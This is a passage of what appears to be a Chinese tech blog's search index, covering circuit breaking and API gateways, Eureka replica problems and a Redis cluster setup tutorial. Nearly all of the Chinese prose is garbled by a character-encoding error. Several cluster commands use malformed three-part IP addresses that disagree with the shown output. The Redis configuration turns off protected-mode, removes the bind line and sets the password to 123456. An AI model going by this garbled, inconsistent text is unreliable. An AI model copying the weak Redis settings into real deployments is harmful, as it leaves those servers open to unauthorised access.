å¸¸è§é—®ç­”ä»€ä¹ˆæ˜¯æœåŠ¡ç†”æ–­ã€æœåŠ¡é™çº§åœ¨å¤æ‚çš„åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œå¾®æœåŠ¡ä¹‹é—´çš„ç›¸äº’è°ƒç”¨ï¼Œæœ‰å¯èƒ½å‡ºç°å„ç§å„æ ·çš„åŸå› å¯¼è‡´æœåŠ¡çš„é˜»å¡ï¼›åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼ŒæœåŠ¡çš„é˜»å¡æ„å‘³ç€çº¿ç¨‹çš„é˜»å¡ï¼Œå¯¼è‡´å½“å‰çº¿ç¨‹ä¸å¯ç”¨ï¼Œæ›´ä¸¥é‡çš„ä¼šè®©æœåŠ¡å™¨çº¿ç¨‹å…¨éƒ¨é˜»å¡ï¼Œå¯¼è‡´æœåŠ¡å™¨å´©æºƒã€‚ç”±äºæœåŠ¡ä¹‹é—´çš„è°ƒç”¨å…³ç³»æ˜¯åŒæ­¥çš„ï¼Œä¼šå¯¹æ•´ä¸ªå¾®æœåŠ¡ç³»ç»Ÿé€ æˆæœåŠ¡é›ªå´©ã€‚ä¸ºäº†è§£å†³æŸä¸ªå¾®æœåŠ¡çš„è°ƒç”¨å“åº”æ—¶é—´è¿‡é•¿æˆ–è€…ä¸å¯ç”¨è¿›è€Œå ç”¨è¶Šæ¥è¶Šå¤šçš„ç³»ç»Ÿèµ„æºå¼•èµ·çš„é›ªå´©æ•ˆåº”ï¼Œè¿™å°±éœ€è¦è¿›è¡ŒæœåŠ¡ç†”æ–­å’ŒæœåŠ¡é™çº§å¤„ç†ã€‚æœåŠ¡ç†”æ–­æŒ‡çš„æ˜¯æŸä¸ªæœåŠ¡å‡ºç°æ•…éšœæˆ–å¼‚å¸¸æ—¶ï¼Œèµ·åˆ°ç±»ä¼¼ç°å®ä¸–ç•Œä¸­çš„ â€œä¿é™©ä¸â€ çš„ä½œç”¨ï¼Œå³å½“æŸä¸ªå¼‚å¸¸æ¡ä»¶è¢«è§¦å‘å°±ç›´æ¥ç†”æ–­æ•´ä¸ªæœåŠ¡ï¼Œè€Œä¸æ˜¯ä¸€ç›´ç­‰åˆ°æ­¤æœåŠ¡è¶…æ—¶ã€‚ç®€è€Œè¨€ä¹‹ï¼Œä¸€æ—¦å‘ç”ŸæœåŠ¡é›ªå´©å°±ä¼šç†”æ–­æ•´ä¸ªæœåŠ¡ï¼Œé€šè¿‡ç»´æŠ¤ä¸€ä¸ªçº¿ç¨‹æ± ï¼Œå½“çº¿ç¨‹è¾¾åˆ°é˜ˆå€¼çš„æ—¶å€™å°±å¯åŠ¨æœåŠ¡é™çº§ï¼Œå¦‚æœå…¶ä»–è¯·æ±‚ç»§ç»­è®¿é—®å°±ç›´æ¥è¿”å› FallBack çš„é»˜è®¤å€¼ã€‚ ä»€ä¹ˆæ˜¯ API ç½‘å…³API ç½‘å…³æä¾› API å…¨æ‰˜ç®¡æœåŠ¡ï¼Œä¸°å¯Œçš„ API ç®¡ç†åŠŸèƒ½ï¼Œè¾…åŠ©ä¼ä¸šç®¡ç†å¤§è§„æ¨¡çš„ APIï¼Œä»¥é™ä½ç®¡ç†æˆæœ¬å’Œå®‰å…¨é£é™©ã€‚å…¶ä¸­åŒ…æ‹¬ï¼š åè®®é€‚é…ï¼šå½“å¯¹å¤–æä¾›æœåŠ¡æ—¶ä½¿ç”¨ HTTP åè®®ã€å†…éƒ¨æœåŠ¡è°ƒç”¨æ—¶ä½¿ç”¨ RPCï¼Œæ­¤æ—¶éœ€è¦åè®®é€‚é… åè®®è½¬å‘ï¼šå°†å¤–éƒ¨çš„ HTTP è¯·æ±‚è½¬æ¢ä¸ºå†…éƒ¨çš„ RPC è¯·æ±‚ å®‰å…¨ç­–ç•¥ï¼ˆWAFï¼‰ï¼šæ¶æ„æ”»å‡»ã€ç”µå•†ç³»ç»Ÿæˆ–è€… O2O ç³»ç»Ÿçš„é˜²åˆ·å•ã€Web çˆ¬è™« ç³»ç»Ÿé˜²åˆ·ï¼šé˜²åˆ·å•ã€Web çˆ¬è™« æµé‡æ§åˆ¶ï¼šé™æµã€é˜² DDOS æ”»å‡» ç›‘æ§æ—¥å¿—ï¼šAPI è°ƒç”¨æ—¥å¿— var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ä¼ä¸šé¢è¯•"},{title:"Eureka å¼€å‘éšç¬”",url:"/posts/6cbc15f0.html",text:'Eureka æ­å»ºé›†ç¾¤ï¼ŒèŠ‚ç‚¹å‡å‡ºç°åœ¨ unavailable-replicas ä¸‹ Eureka æ­å»ºé«˜å¯ç”¨é›†ç¾¤ï¼Œå¯åŠ¨å¤šä¸ªæ³¨å†Œä¸­å¿ƒåï¼ŒèŠ‚ç‚¹å‡å‡ºç°åœ¨ unavailable-replicasï¼ŒæŸ¥é˜…å„ç±»èµ„æ–™å’Œæµ‹è¯•ï¼Œæä¾›çš„æ–¹æ¡ˆå¦‚ä¸‹ï¼š eureka.client.serviceUrl.defaultZone é…ç½®é¡¹çš„åœ°å€ï¼Œä¸èƒ½ä½¿ç”¨ localhost æˆ–è€…å†…ç½‘/å¤–ç½‘ IPï¼Œè¦ä½¿ç”¨åŸŸåï¼ŒDNS è§£æè¯·è‡ªè¡Œé…ç½®ï¼Œä¹Ÿå¯ä»¥åœ¨æœ¬æœºçš„ /etc/hosts é‡Œæ˜ å°„åŸŸå spring.application.name è¦ä¸€è‡´ï¼ˆé»˜è®¤ä¸é…ç½®ä¹Ÿå¯ä»¥ï¼‰ register-with-eureka è®¾ç½®ä¸º trueï¼ˆé»˜è®¤ä¸é…ç½®ä¹Ÿå¯ä»¥ï¼‰ 1234eureka: client: register-with-eureka: true fetch-registry: false é…ç½® eureka.instance.hostname (å¥½åƒçœ‹åˆ°è¿‡æ­£å¸¸æƒ…å†µä¸‹ Eureka ä¼šè‡ªåŠ¨æ‹‰å–è®¾å¤‡ Hostï¼Œä½†å„èŠ‚ç‚¹åœ¨åŒä¸€æœºå™¨ä¸‹æ—¶è¯·åŠ¡å¿…æ·»åŠ ï¼Œæ³¨æ„å„èŠ‚ç‚¹é…ç½®è‡ªå·±èŠ‚ç‚¹çš„ Host) 123eureka: instance: hostname: host1 åƒæŠ˜è…¾ä¸‡æŠ˜è…¾è¿˜æ˜¯ä¸å¥½ä½¿çš„æ—¶å€™ï¼Œè¯·å»æ‰ä¸‹é¢è¿™ä¸ªå‚æ•°æˆ–è€…æ”¹ä¸º falseï¼ˆç¥å‘ï¼‰ï¼Œæœªæ‰¾åˆ°å®˜æ–¹åŸå›  123eureka: instance: prefer-ip-address: false ä¸ªäººå¤§æ¦‚ç†è§£äº†ä¸‹ï¼Œprefer-ip-address: true ä¸ºä¸ä½¿ç”¨ä¸»æœºåæ¥å®šä¹‰æ³¨å†Œä¸­å¿ƒçš„åœ°å€ï¼Œè€Œä½¿ç”¨ IP åœ°å€çš„å½¢å¼ï¼Œè€Œ defaultZone ä¸­æ˜¯ä»¥åŸŸåçš„æ–¹å¼å‘æ³¨å†Œä¸­å¿ƒæ³¨å†Œçš„ï¼ˆæµ‹è¯•äº†ä¸‹ä½¿ç”¨ IP æ³¨å†Œåˆ°å¤‡ä»½èŠ‚ç‚¹ä¸å¯è¯†åˆ«ï¼‰ï¼Œæœ€ç»ˆå¯¼è‡´åˆ†ç‰‡èŠ‚ç‚¹ä¸èƒ½è¯†åˆ«åŒ¹é…ï¼ˆIP åœ°å€ä¸åŸŸåï¼‰ï¼Œè€Œè®¤ä¸ºåˆ†ç‰‡å‡å¤„äºä¸å¯è¾¾çŠ¶æ€ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡ å¼€å‘éšç¬”"},{title:"Linux æ­å»º Redis é«˜å¯ç”¨é›†ç¾¤",url:"/posts/b8e96a9f.html",text:'å‰è¨€è½¯ä»¶ç¯å¢ƒ è½¯ä»¶ ç‰ˆæœ¬ CentOS 7.9 Redis 6.0.6 é›†ç¾¤èŠ‚ç‚¹è§„åˆ’Redis é›†ç¾¤è‡³å°‘ä¸€å…±éœ€è¦ 6 ä¸ªèŠ‚ç‚¹ï¼ŒåŒ…æ‹¬ 3 ä¸ª Master èŠ‚ç‚¹å’Œ 3 ä¸ª Slave èŠ‚ç‚¹ï¼Œä¸”æ¯ä¸ª Master èŠ‚ç‚¹å¯¹åº” 1 ä¸ª Slave èŠ‚ç‚¹ï¼Œå¯¹åº”çš„å…³ç³»å¦‚ä¸‹ï¼š 1 Master â€“&gt; 1 Slaveï¼ŒRedis é›†ç¾¤éœ€è¦ 6 ä¸ªèŠ‚ç‚¹ï¼Œå¦‚å›¾æ‰€ç¤º 1 Master â€“&gt; 2 Slaveï¼ŒRedis é›†ç¾¤éœ€è¦ 9 ä¸ªèŠ‚ç‚¹ï¼Œä»¥æ­¤ç±»æ¨ï¼Œå¦‚å›¾æ‰€ç¤º åç§° IP ç«¯å£ Master 192.168.109 7001 Master 192.168.109 7002 Master 192.168.109 7003 Slave 192.168.109 7004 Slave 192.168.109 7005 Slave 192.168.109 7006 Redis é›†ç¾¤ç‰¹æ€§Redis é›†ç¾¤çš„ä¼˜ç‚¹æ— ä¸­å¿ƒæ¶æ„ï¼Œåˆ†å¸ƒå¼æä¾›æœåŠ¡ã€‚æ•°æ®æŒ‰ç…§ slot å­˜å‚¨åˆ†å¸ƒåœ¨å¤šä¸ª Redis å®ä¾‹ä¸Šã€‚å¢åŠ  Slave åš Standby æ•°æ®å‰¯æœ¬ï¼Œç”¨äº Failoverï¼Œä½¿é›†ç¾¤å¿«é€Ÿæ¢å¤ã€‚å®ç°æ•…éšœ Auto Failoverï¼ŒèŠ‚ç‚¹ä¹‹é—´é€šè¿‡ gossip åè®®äº¤æ¢çŠ¶æ€ä¿¡æ¯ï¼›æŠ•ç¥¨æœºåˆ¶å®Œæˆ Slave åˆ° Master è§’è‰²çš„æå‡ã€‚æ”¯æŒåœ¨çº¿å¢åŠ æˆ–å‡å°‘èŠ‚ç‚¹ï¼Œé™ä½ç¡¬ä»¶æˆæœ¬å’Œè¿ç»´æˆæœ¬ï¼Œæé«˜ç³»ç»Ÿçš„æ‰©å±•æ€§å’Œå¯ç”¨æ€§ã€‚ Redis é›†ç¾¤çš„ç¼ºç‚¹å®¢æˆ·ç«¯å®ç°å¤æ‚ï¼Œé©±åŠ¨è¦æ±‚å®ç° Smart Clientï¼Œç¼“å­˜ Slots Mapping ä¿¡æ¯å¹¶åŠæ—¶æ›´æ–°ã€‚ç›®å‰ä»… JedisCluster ç›¸å¯¹æˆç†Ÿï¼Œå¼‚å¸¸å¤„ç†éƒ¨åˆ†è¿˜ä¸å®Œå–„ã€‚å®¢æˆ·ç«¯çš„ä¸æˆç†Ÿï¼Œå½±å“åº”ç”¨çš„ç¨³å®šæ€§ï¼Œæé«˜å¼€å‘éš¾åº¦ã€‚èŠ‚ç‚¹ä¼šå› ä¸ºæŸäº›åŸå› å‘ç”Ÿé˜»å¡ï¼ˆé˜»å¡æ—¶é—´å¤§äº clutser-node-timeoutï¼‰ï¼Œè¢«åˆ¤æ–­ä¸ºä¸‹çº¿ã€‚è¿™ç§ Failover æ˜¯æ²¡æœ‰å¿…è¦çš„ï¼ŒSentinel æ¨¡å¼ä¹Ÿå­˜åœ¨è¿™ç§åˆ‡æ¢åœºæ™¯ã€‚ Redis é›†ç¾¤æ­å»ºç³»ç»Ÿåˆå§‹åŒ–12345678# æ·»åŠ é…ç½®ä¸€# echo "net.core.somaxconn = 1024" &gt;&gt; /etc/sysctl.conf# echo "vm.overcommit_memory = 1" &gt;&gt; /etc/sysctl.conf# sysctl -p# æ·»åŠ é…ç½®äºŒ# echo "echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled" &gt;&gt; /etc/rc.local# source /etc/rc.local åˆ›å»º Redis ç”¨æˆ·12345# åˆ›å»ºredisç”¨æˆ·ç»„# groupadd redis# åˆ›å»ºredisç”¨æˆ·ï¼ˆä¸å…è®¸è¿œç¨‹ç™»å½•ï¼‰# useradd -g redis redis -s /bin/false Redis ç¼–è¯‘å®‰è£…Redis å„ç‰ˆæœ¬å¯ä»¥ä»å®˜ç½‘ä¸‹è½½ï¼Œè¿™é‡Œä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯ 6.0.6 1234567891011121314151617181920212223242526272829303132333435363738# å®‰è£…ä¾èµ–# yum install -y centos-release-scl devtoolset-9 scl-utils-build tcl# ä¸´æ—¶å¯ç”¨GCC9ç¼–è¯‘ç¯å¢ƒ# scl enable devtoolset-9 bash# ä¸‹è½½æ–‡ä»¶# wget http://download.redis.io/releases/redis-6.0.6.tar.gz# è§£å‹æ–‡ä»¶# tar -xvf redis-6.0.6.tar.gz# è¿›å…¥è§£å‹ç›®å½•# cd redis-6.0.6# ç¼–è¯‘# make# å®‰è£…# make install PREFIX=/usr/local/redis# åˆ›å»ºè½¯è¿æ¥# ln -s /usr/local/redis/bin/redis-benchmark /usr/local/bin/redis-benchmark# ln -s /usr/local/redis/bin/redis-check-aof /usr/local/bin/redis-check-aof# ln -s /usr/local/redis/bin/redis-check-rdb /usr/local/bin/redis-check-rdb# ln -s /usr/local/redis/bin/redis-sentinel /usr/local/bin/redis-sentinel# ln -s /usr/local/redis/bin/redis-server /usr/local/bin/redis-server# ln -s /usr/local/redis/bin/redis-cli /usr/local/bin/redis-cli# æ‹·è´é…ç½®æ–‡ä»¶# cp redis.conf /usr/local/redis# åˆ›å»ºæ—¥å¿—ç›®å½•# mkdir -p /var/log/redis# æ–‡ä»¶æˆæƒ# chown -R redis:redis /var/log/redis# chown -R redis:redis /usr/local/redis æ›´æ”¹ Redis çš„åŸºç¡€é…ç½®å†…å®¹ï¼Œå…¶ä¸­æœ‰äº›é…ç½®æ–‡ä»¶çš„æ–‡ä»¶åéƒ½åŒ…å«äº†ç«¯å£å·ï¼Œæ˜¯ä¸ºäº†åé¢æ–¹ä¾¿ä½¿ç”¨ä¸åŒçš„ç«¯å£å·æ¥åŒºåˆ†å„ä¸ªèŠ‚ç‚¹ 1234567891011121314# æ›´æ”¹åŸºç¡€é…ç½®# vim /usr/local/redis/redis.confio-threads 2daemonize yes# bind 127.0.0.1protected-mode nomasterauth 123456requirepass 123456dbfilename dump_6379.rdbpidfile /var/run/redis_6379.pidcluster-config-file nodes_6379.confappendfilename "appendonly_6379.aof"logfile "/var/log/redis/redis_6379.log" éªŒè¯ Redis æ˜¯å¦å®‰è£…æˆåŠŸ 12345678910111213141516# åˆ‡æ¢Redisç”¨æˆ·# su redis# è¿›å…¥å®‰è£…ç›®å½•$ cd /usr/local/redis# å¯åŠ¨Redis$ ./bin/redis-server redis.conf# æŸ¥çœ‹Redisçš„è¿è¡ŒçŠ¶æ€$ ps -aux|grep redis# å…³é—­Redis$ ./bin/redis-cli127.0.0.1:6379&gt; auth 123456127.0.0.1:6379&gt; shutdown Redis æ­å»ºé›†ç¾¤åˆ›å»º Redis é›†ç¾¤å„èŠ‚ç‚¹çš„å®‰è£…æ–‡ä»¶ï¼Œå¹¶æ›´æ”¹ä¸ç«¯å£ç›¸å…³çš„æ‰€æœ‰é…ç½®å†…å®¹ï¼ˆä¾‹å¦‚ï¼športã€pidfileã€dbfilenameã€logfileã€cluster-config-fileï¼‰ï¼ŒåŒæ—¶å¼€å¯å¯¹é›†ç¾¤çš„æ”¯æŒ 1234567891011121314151617181920212223242526# åˆ›å»ºé›†ç¾¤ç›®å½•# mkdir -p /usr/local/redis-cluster# æ‹·è´å„èŠ‚ç‚¹çš„å®‰è£…æ–‡ä»¶# cp -r /usr/local/redis /usr/local/redis-cluster/redis-7001# cp -r /usr/local/redis /usr/local/redis-cluster/redis-7002# cp -r /usr/local/redis /usr/local/redis-cluster/redis-7003# cp -r /usr/local/redis /usr/local/redis-cluster/redis-7004# cp -r /usr/local/redis /usr/local/redis-cluster/redis-7005# cp -r /usr/local/redis /usr/local/redis-cluster/redis-7006# æ›´æ”¹å„èŠ‚ç‚¹é‡Œä¸ç«¯å£ç›¸å…³çš„æ‰€æœ‰é…ç½®é¡¹# sed -i "s/6379/7001/g" /usr/local/redis-cluster/redis-7001/redis.conf# sed -i "s/6379/7002/g" /usr/local/redis-cluster/redis-7002/redis.conf# sed -i "s/6379/7003/g" /usr/local/redis-cluster/redis-7003/redis.conf# sed -i "s/6379/7004/g" /usr/local/redis-cluster/redis-7004/redis.conf# sed -i "s/6379/7005/g" /usr/local/redis-cluster/redis-7005/redis.conf# sed -i "s/6379/7006/g" /usr/local/redis-cluster/redis-7006/redis.conf# å¼€å¯å„èŠ‚ç‚¹å¯¹é›†ç¾¤çš„æ”¯æŒ# sed -i "s/# cluster-enabled/cluster-enabled/g" `find /usr/local/redis-cluster -type f -name "redis.conf"`# sed -i "s/# cluster-config-file/cluster-config-file/g" `find /usr/local/redis-cluster -type f -name "redis.conf"`# sed -i "s/# cluster-node-timeout/cluster-node-timeout/g" `find /usr/local/redis-cluster -type f -name "redis.conf"`# æ–‡ä»¶æˆæƒ# chown -R redis:redis /usr/local/redis-cluster æ‹·è´ Redis çš„é›†ç¾¤ç®¡ç†å·¥å…· 12345678# è¿›å…¥Redisçš„è§£å‹ç›®å½•# cd redis-6.0.6# æ‹·è´é›†ç¾¤ç®¡ç†å·¥å…·# cp src/redis-trib.rb /usr/local/redis-cluster# æ–‡ä»¶æˆæƒ# chown -R redis:redis /usr/local/redis-cluster/redis-trib.rb åˆ›å»º Shell è„šæœ¬æ‰¹é‡å¯åŠ¨ Redis é›†ç¾¤çš„å„ä¸ªèŠ‚ç‚¹ 12345678910111213141516171819202122# vim /usr/local/redis-cluster/start-cluster.sh#!/bin/bashREDIS_CLUSTER_HOME=/usr/local/redis-clustercd $REDIS_CLUSTER_HOMEcd redis-7001./bin/redis-server redis.confcd ..cd redis-7002./bin/redis-server redis.confcd ..cd redis-7003./bin/redis-server redis.confcd ..cd redis-7004./bin/redis-server redis.confcd ..cd redis-7005./bin/redis-server redis.confcd ..cd redis-7006./bin/redis-server redis.conf Shell è„šæœ¬æˆæƒæ‰§è¡Œ 123# æ–‡ä»¶æˆæƒ# chmod +x /usr/local/redis-cluster/start-cluster.sh# chown -R redis:redis /usr/local/redis-cluster/start-cluster.sh Redis é›†ç¾¤è®¾ç½®å¯†ç è‹¥éœ€è¦å¯¹é›†ç¾¤å„èŠ‚ç‚¹è®¾ç½®å¯†ç ï¼Œé‚£ä¹ˆ requirepass å’Œ masterauth éƒ½éœ€è¦åŒæ—¶è®¾ç½®ï¼Œä¸”ä¸¤è€…çš„å¯†ç å¿…é¡»ä¸€è‡´ï¼Œå¦åˆ™å‘ç”Ÿä¸»ä»åˆ‡æ¢æ—¶ï¼Œå°±ä¼šé‡åˆ°æˆæƒé—®é¢˜ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨ä½¿ç”¨ redis-trib.rb æˆ–è€… redis-cli æ„å»ºé›†ç¾¤çš„æ—¶å€™ï¼Œä¸¤è€…è®¾ç½®å¯†ç çš„æ–¹å¼æ˜¯ä¸ä¸€æ ·çš„ï¼Œå…·ä½“å¦‚ä¸‹ï¼š redis-trib.rbï¼šå¦‚æœæ˜¯ä½¿ç”¨ redis-trib.rb å·¥å…·æ„å»ºé›†ç¾¤ï¼Œé›†ç¾¤æ„å»ºå®Œæˆå‰ä¸è¦é…ç½®å¯†ç ï¼Œé›†ç¾¤æ„å»ºå®Œæ¯•éœ€è¦æ‰§è¡Œä»¥ä¸‹å‘½ä»¤é€ä¸ªèŠ‚ç‚¹æœºå™¨è®¾ç½®å¯†ç ï¼Œä¸éœ€è¦é‡å¯èŠ‚ç‚¹ 1234$ redis-cli -c -p 7001config set masterauth 123456config set requirepass 123456config rewrite redis-cliï¼šå¦‚æœæ˜¯ä½¿ç”¨ redis-cli æ„å»ºé›†ç¾¤ï¼Œé¦–å…ˆéœ€è¦åœ¨é›†ç¾¤å„èŠ‚ç‚¹çš„ redis.conf ä¸­é…ç½®å¯†ç ï¼ŒåŒ…æ‹¬ requirepass å’Œ masterauthï¼Œç„¶ååœ¨æ„å»ºé›†ç¾¤çš„å‘½ä»¤è¡Œé‡ŒåŠ å…¥ -a password å‚æ•°ï¼Œå…¶ä¸­çš„ password å°±æ˜¯é›†ç¾¤å„èŠ‚ç‚¹çš„å¯†ç  12masterauth 123456requirepass 123456 12345678$ redis-cli -a 123456 --cluster create \\192.168.109:7001 \\192.168.109:7002 \\192.168.109:7003 \\192.168.109:7004 \\192.168.109:7005 \\192.168.109:7006 \\--cluster-replicas 1 Redis é›†ç¾¤æ„å»ºå¯åŠ¨é¦–å…ˆæ‰§è¡Œ Shell è„šæœ¬æ‰¹é‡å¯åŠ¨æ‰€æœ‰ Redis èŠ‚ç‚¹ï¼Œåˆ‡è®°ä¸èƒ½ä»¥ Root ç”¨æˆ·çš„èº«ä»½å¯åŠ¨ Redisï¼Œå¦åˆ™ä¼šé€ æˆç³»ç»Ÿé‡å¤§å®‰å…¨éšæ‚£ 123456789101112131415# åˆ‡æ¢åˆ°Redisç”¨æˆ·# su redis# å¯åŠ¨é›†ç¾¤èŠ‚ç‚¹$ ./usr/local/redis-cluster/start-cluster.sh# æŸ¥çœ‹å„èŠ‚ç‚¹çš„è¿è¡ŒçŠ¶æ€$ ps -aux|grep redisredis 32641 0.0 0.0 181880 7688 ? Ssl 21:33 0:00 ./bin/redis-server *:7001 [cluster]redis 32649 0.0 0.0 181880 7688 ? Ssl 21:33 0:00 ./bin/redis-server *:7002 [cluster]redis 32657 0.0 0.0 181880 7688 ? Ssl 21:33 0:00 ./bin/redis-server *:7003 [cluster]redis 20814 0.0 0.0 181880 7688 ? Ssl 21:33 0:00 ./bin/redis-server *:7004 [cluster]redis 20822 0.0 0.0 181880 7688 ? Ssl 21:33 0:00 ./bin/redis-server *:7005 [cluster]redis 20830 0.0 0.0 181880 7688 ? Ssl 21:33 0:00 ./bin/redis-server *:7006 [cluster] ä½¿ç”¨ redis-trib.rb å·¥å…·æ„å»ºé›†ç¾¤æ—¶ï¼Œåœ¨ 6.0.6 é‡Œé¢ä¼šç»™æ‰“å°æç¤ºï¼Œè®©ä½ ä½¿ç”¨ redis-cli å‘½ä»¤æ¥æ„å»ºé›†ç¾¤ï¼Œå¹¶æä¾›ç»™ä½ éœ€è¦ä½¿ç”¨çš„å‘½ä»¤ï¼Œä½¿å…¶å’Œ redis-trib.rb è¾¾åˆ°ä¸€è‡´çš„æ•ˆæœï¼ˆè¿™æ ·å°±å¯ä»¥ä¸ç”¨å†å•ç‹¬çš„å®‰è£… Rubyï¼‰ï¼ŒåŸæœ¬ä½¿ç”¨ redis-trib.rb çš„è¯­å¥å¦‚ä¸‹ 1234567$ ./redis-trib.rb create --replicas 1 \\192.168.109:7001 \\192.168.109:7002 \\192.168.109:7003 \\192.168.109:7004 \\192.168.109:7005 \\192.168.109:7006 æä¾›ä½¿ç”¨çš„ redis-cli çš„è¯­å¥å¦‚ä¸‹ï¼Œå»ºè®®ä½¿ç”¨ redis-cli å‘½ä»¤æ¥æ„å»º Redis é›†ç¾¤ï¼Œå› ä¸ºè¿™æ ·å°±ä¸éœ€è¦é¢å¤–å®‰è£… Ruby 12345678$ redis-cli -a 123456 --cluster create \\192.168.109:7001 \\192.168.109:7002 \\192.168.109:7003 \\192.168.109:7004 \\192.168.109:7005 \\192.168.109:7006 \\--cluster-replicas 1 å¯ä»¥çœ‹å‡ºä¸¤ä¸ªè¯­å¥éƒ½å·®ä¸å¤šï¼Œè€Œä¸”è¯­å¥æ„æ€ä¹Ÿå·®ä¸å¤šï¼Œ--cluster-replicas 1 è¡¨ç¤ºä¸»å¤‡çš„æ¯”ä¾‹å…³ç³»ä¸º 1ï¼Œå³ä¸€ä¸ªä¸»èŠ‚ç‚¹å¯¹åº”ä¸€ä¸ªå¤‡èŠ‚ç‚¹ï¼Œå‰ä¸‰ä¸ª ip:port é»˜è®¤è¡¨ç¤ºä¸»èŠ‚ç‚¹ï¼Œåé¢çš„ä¾æ¬¡ä¸ºå‰ä¸‰ä¸ªä¸»èŠ‚ç‚¹çš„å¤‡èŠ‚ç‚¹ã€‚åœ¨ç”Ÿäº§ç¯å¢ƒä½¿ç”¨å¤šå°æœåŠ¡å™¨æ­å»º Redis é›†ç¾¤æ—¶ï¼Œä¸ºäº†ä¿è¯é«˜å¯ç”¨ï¼ˆåœ¨ä»»æ„ä¸€å°æœåŠ¡å™¨æŒ‚äº†çš„æƒ…å†µä¸‹éƒ½ä¸å½±å“ Redis é›†ç¾¤çš„ä½¿ç”¨ï¼‰ï¼Œä¸»å¤‡èŠ‚ç‚¹ä¸å¯ä»¥éƒ¨ç½²åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šï¼Œå› ä¸ºä¸»å¤‡èŠ‚ç‚¹åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šï¼Œåˆ™å¤‡èŠ‚ç‚¹ä¹Ÿæ²¡æœ‰å¤ªå¤§çš„æ„ä¹‰äº†ï¼Œæ‰€ä»¥è¦é”™å¼€å¯¹åº”ã€‚å½“ä¸»èŠ‚ç‚¹å®•æœºåï¼Œå¤‡èŠ‚ç‚¹å¯ä»¥å……å½“ä¸»èŠ‚ç‚¹ç»§ç»­å·¥ä½œï¼Œä½¿ Redis é›†ç¾¤æ­£å¸¸è¿è¡Œã€‚ æ‰§è¡Œå®Œæ„å»ºé›†ç¾¤çš„å‘½ä»¤åï¼ˆåªéœ€æ‰§è¡Œä¸€æ¬¡ï¼‰ï¼ŒRedis é»˜è®¤ç½—åˆ—å‡ºé›†ç¾¤çš„å¯¹åº”å…³ç³»æ¥è®©ä½ ç¡®å®šï¼Œè¾“å…¥ yes å®Œæˆé›†ç¾¤åˆ›å»ºå³å¯ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&gt;&gt;&gt; Performing hash slots allocation on 6 nodes...Master[0] -&gt; Slots 0 - 5460Master[1] -&gt; Slots 5461 - 10922Master[2] -&gt; Slots 10923 - 16383Adding replica 192.168.1.109:7006 to 192.168.1.109:7001Adding replica 192.168.1.109:7003 to 192.168.1.109:7004Adding replica 192.168.1.109:7005 to 192.168.1.109:7002M: 225e37e5bb340467fb58b6f9d14cfb1893bf92d5 192.168.1.109:7001 slots:[0-5460] (5461 slots) masterM: 283abb498445ffd6206f24c451ac0b9fb7129383 192.168.1.109:7002 slots:[10923-16383] (5461 slots) masterM: 7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4 192.168.1.109:7004 slots:[5461-10922] (5462 slots) masterS: cde86683e2d314fd52cf8708f78935c6648ea3c6 192.168.1.109:7003 replicates 7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4S: 1f3f441d619ceeac55ae91015a3f46ede37352bb 192.168.1.109:7005 replicates 283abb498445ffd6206f24c451ac0b9fb7129383S: f8a5d94e9928ed615514f23ddaabd259134af709 192.168.1.109:7006 replicates 225e37e5bb340467fb58b6f9d14cfb1893bf92d5Can I set the above configuration? (type \'yes\' to accept):&gt;&gt;&gt; Nodes configuration updated&gt;&gt;&gt; Assign a different config epoch to each node&gt;&gt;&gt; Sending CLUSTER MEET messages to join the clusterWaiting for the cluster to join.&gt;&gt;&gt; Performing Cluster Check (using node 192.168.1.109:7001)M: 225e37e5bb340467fb58b6f9d14cfb1893bf92d5 192.168.1.109:7001 slots:[0-5460] (5461 slots) master 1 additional replica(s)M: 7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4 192.168.1.109:7004 slots:[5461-10922] (5462 slots) master 1 additional replica(s)S: f8a5d94e9928ed615514f23ddaabd259134af709 192.168.1.109:7006 slots: (0 slots) slave replicates 225e37e5bb340467fb58b6f9d14cfb1893bf92d5S: 1f3f441d619ceeac55ae91015a3f46ede37352bb 192.168.1.109:7005 slots: (0 slots) slave replicates 283abb498445ffd6206f24c451ac0b9fb7129383M: 283abb498445ffd6206f24c451ac0b9fb7129383 192.168.1.109:7002 slots:[10923-16383] (5461 slots) master 1 additional replica(s)S: cde86683e2d314fd52cf8708f78935c6648ea3c6 192.168.1.109:7003 slots: (0 slots) slave replicates 7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4[OK] All nodes agree about slots configuration.&gt;&gt;&gt; Check for open slots...&gt;&gt;&gt; Check slots coverage...[OK] All 16384 slots covered. æµ‹è¯• Redis é›†ç¾¤Redis 